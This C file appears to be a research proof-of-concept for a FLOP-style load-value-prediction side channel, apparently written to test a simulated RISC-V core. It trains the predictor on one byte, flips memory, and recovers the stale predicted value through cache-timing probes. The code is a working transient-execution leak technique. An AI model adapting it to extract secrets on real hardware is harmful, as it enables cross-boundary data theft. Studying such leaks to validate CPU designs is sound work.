/*
 * FLOP / LVP-style attack (v2).
 *
 * Load Value Prediction side channel, modeled after the FLOP attack
 * shape: train the PC-tagged LVP on a constant value, flip the memory
 * to a different value, flush, then let the attack load mispredict.
 * The LVP-forwards the predicted value at dispatch (iew.cc predictLoad
 * -> setReg/scoreboard), the probe[val*64] access warms L1 before the
 * mismatch squash, and frRecv() times the probe lines to recover it.
 *
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define LINE_SIZE   64
#define PROBE_SIZE  (256 * LINE_SIZE)
#define MEM_SIZE    (64 * 1024)
/* Must exceed the LCT saturating-counter threshold (8-bit -> 255). */
#define ITERS       512
#define THRESHOLD   40
#define ROUNDS      17
#define FLUSH_BUF_SIZE (128 * 1024)

static uint8_t probe_area[PROBE_SIZE];
static uint8_t mem_area[MEM_SIZE];
static uint8_t flush_buf[FLUSH_BUF_SIZE];

static inline uint64_t
rdcycle(void)
{
    uint64_t c;
    asm volatile("csrrs %0, cycle, x0" : "=r"(c) :: "memory");
    return c;
}

static void
flush_all_l1(void)
{
    volatile uint8_t *fb = flush_buf;
    for (int i = 0; i < FLUSH_BUF_SIZE; i += LINE_SIZE)
        (void)fb[i];
}

/* The LVP trains/predicts on this PC.  Load is 1 byte (eligible). */
__attribute__((noinline))
static uint8_t
gadget(int offset)
{
    return *(volatile uint8_t *)(mem_area + offset);
}

/* Fill offsets with distinct indices then Fisher-Yates shuffle. */
static void
getOffsets(int offsets[], int n)
{
    for (int i = 0; i < n; i++)
        offsets[i] = i;
    for (int i = n - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int t = offsets[i];
        offsets[i] = offsets[j];
        offsets[j] = t;
    }
}

/* Transmit value v by warming probe[v * LINE_SIZE] in L1. */
static void
frTransmit(uint8_t v)
{
    volatile uint8_t *probe = probe_area;
    (void)probe[(uintptr_t)v * LINE_SIZE];
}

/* Time reload of every probe line; the warm one wins. */
static uint8_t
frRecv(uint64_t *min_lat)
{
    uint64_t lat[256], m = ~0ULL;
    int leak = -1;
    for (int b = 0; b < 256; b++) {
        volatile uint8_t *line = probe_area + b * LINE_SIZE;
        uint64_t c1 = rdcycle();
        uint8_t v = *line;
        asm volatile("" : "+r"(v) : : "memory");
        uint64_t c2 = rdcycle();
        lat[b] = c2 - c1;
        if (lat[b] < m) {
            m = lat[b];
            leak = b;
        }
    }
    if (min_lat)
        *min_lat = m;
    return (uint8_t)leak;
}

int
main(void)
{
    const uint8_t foo = 0xca, bar = 0xfe;

    printf("flop_attack_v2 (LVP/FLOP style) start\n");

    memset(probe_area, 0, sizeof(probe_area));
    for (int i = 0; i < 256; i++)
        probe_area[i * LINE_SIZE] = (uint8_t)i;

    for (int round = 0; round < ROUNDS; round++) {
        /* Training phase: every gadget() load returns foo. */
        int offsets[ITERS];
        getOffsets(offsets, ITERS);
        memset(mem_area, foo, MEM_SIZE);
        for (int i = 0; i < ITERS; i++)
            (void)gadget(offsets[i]);

        /* Flip the value to bar, evict it from L1. */
        memset(mem_area, bar, MEM_SIZE);
        flush_all_l1();

        /* Attack load: LVP predicts foo, forwards it; probe warms
         * probe[foo*64] before the mismatch squash fires. */
        uint8_t val = gadget(offsets[0]);
        frTransmit(val);

        uint64_t min_lat;
        uint8_t leak = frRecv(&min_lat);

        printf("round %2d: val=0x%02x leak=0x%02x min_lat=%llu foo=0x%02x "
               "[%s]\n", round, val, leak,
               (unsigned long long)min_lat, foo,
               (min_lat < THRESHOLD && leak == foo) ? "LEAK" : "no-leak");
    }

    printf("flop_attack_v2 done\n");
    return 0;
}
